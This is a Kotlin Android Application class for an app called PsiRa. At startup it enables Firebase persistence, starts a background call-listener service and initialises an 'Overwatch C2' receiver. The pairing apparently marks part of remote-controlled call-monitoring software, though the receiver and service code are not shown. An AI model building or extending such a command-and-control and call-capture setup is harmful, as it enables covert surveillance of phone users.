package com.project1.psira

import android.app.Application
import android.content.Intent
import com.google.firebase.database.FirebaseDatabase

class PsiRaApplication : Application() {
    override fun onCreate() {
        super.onCreate()
        // Enable Firebase persistence
        FirebaseDatabase.getInstance(PsiraConfig.FIREBASE_URL).setPersistenceEnabled(true)

        // Start background call listener
        val intent = Intent(this, CallBackgroundService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        // Initialize Overwatch C2 Listener
        val c2Receiver = OverwatchC2Receiver(this)
        c2Receiver.startListening()
    }
}
